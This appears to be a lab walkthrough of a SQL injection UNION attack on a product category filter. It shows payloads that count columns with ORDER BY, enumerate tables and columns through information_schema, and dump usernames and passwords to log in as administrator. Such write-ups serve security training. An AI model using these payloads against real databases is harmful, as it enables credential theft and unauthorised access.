# Lab: SQL injection UNION attack, retrieving data from other tables

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

***

Let's Start !!

First We Visit The Website !!

<figure><img src="../../../.gitbook/assets/image (701).png" alt=""><figcaption></figcaption></figure>

We Try To Inject Single Quote `'` To Break The Backend Query !!

Our Backend Query Is This Below !!

```
SELECT name,description FROM products WHERE category = 'Pets' 
```

When We Inject The Single Quote `'` Actually The Create Error In The SQL Query !!

```
SELECT name,description FROM products WHERE category = 'Pets''
```

<figure><img src="../../../.gitbook/assets/image (702).png" alt=""><figcaption></figcaption></figure>

We Try To Inject `'--` To Check The Backend Query !!

Our Backend Query Is This Below !!

```
SELECT name,description FROM products WHERE category = 'Pets' 
```

When We Inject `'--` They Fix The Query and Give No Error ,In SQL `--` Refer To Comment Out In Code !!

```
SELECT name,description FROM products WHERE category = 'Pets'--'
```

<figure><img src="../../../.gitbook/assets/image (703).png" alt=""><figcaption></figcaption></figure>

**Finding Number of Columns**

**Method – ORDER BY**

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

If `ORDER BY 3` fails, query has 2 columns.

<figure><img src="../../../.gitbook/assets/image (704).png" alt=""><figcaption></figcaption></figure>

That `ORDER BY 3` fails, query has 2 columns.

it's Mean We assume Right Backend Query They have only Two Columns First is `name` and Second is `description` !!

```
SELECT name,description FROM products WHERE category = 'Pets'
```

<figure><img src="../../../.gitbook/assets/image (705).png" alt=""><figcaption></figcaption></figure>

Let's We Use In Our Two Column Table !!

```
'UNION SELECT 'a','b'--
```

Our Backend Code Look's Like This After Injecting This Query !!

```
SELECT name,description FROM products WHERE category = 'Pets'
UNION
SELECT 'a','b'
```

Then See If Our First and Second Both Column is String They Return No Error !!

<figure><img src="../../../.gitbook/assets/image (706).png" alt=""><figcaption></figcaption></figure>

Use the following payload to retrieve the list of tables in the database:

```
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

<figure><img src="../../../.gitbook/assets/image (707).png" alt=""><figcaption></figcaption></figure>

Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

<figure><img src="../../../.gitbook/assets/image (708).png" alt=""><figcaption></figcaption></figure>

Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

```
' UNION SELECT username,password FROM users--
```

<figure><img src="../../../.gitbook/assets/image (709).png" alt=""><figcaption></figcaption></figure>

Find the password for the `administrator` user, and use it to log in.

<figure><img src="../../../.gitbook/assets/image (710).png" alt=""><figcaption></figcaption></figure>
